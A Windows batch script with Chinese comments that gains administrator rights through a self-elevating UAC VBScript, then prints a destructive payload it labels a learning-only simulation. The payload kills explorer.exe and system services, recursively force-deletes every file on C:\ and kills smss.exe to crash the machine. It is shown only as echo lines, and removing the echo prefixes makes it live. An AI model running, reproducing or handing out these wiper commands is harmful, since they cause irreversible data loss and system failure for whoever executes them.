@echo off
chcp 65001 >nul 2>&1
:: 检测管理员权限
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if not "%errorlevel%"=="0" goto UAC

:GotAdmin
pushd "%~dp0"
echo 已获取管理员权限
echo.
echo 模拟执行破坏代码（危险代码仅展示，不会运行，仅供学习）
echo.
echo ================================================================
echo.
echo 【警告！】严禁移除echo直接运行！会造成系统损坏、数据丢失！仅供学习！
echo.
echo ================================================================
echo.

ping 127.0.0.1 >nul

echo 源代码：
echo taskkill /f /im explorer.exe
echo taskkill /f /im spoolsv.exe
echo taskkill /f /im searchindexer.exe
echo taskkill /f /im wuauclt.exe
echo taskkill /f /im usosvc.exe
echo taskkill /f /im bits.exe
echo taskkill /f /im wmpnetwk.exe
echo taskkill /f /im faxsvc.exe
echo cd /d C:\
echo del /a /f /q /s *
echo taskkill /f /im smss.exe
echo.

ping -n 2 127.0.0.1 >nul
echo 演示结束，按任意键退出...
pause >nul
popd
exit

:UAC
echo 请求管理员权限...
echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\GetAdmin.vbs"
echo UAC.ShellExecute "%~f0", "", "", "runas", 1 >> "%temp%\GetAdmin.vbs"
"%temp%\GetAdmin.vbs"
del /f /q "%temp%\GetAdmin.vbs" >nul 2>&1
exit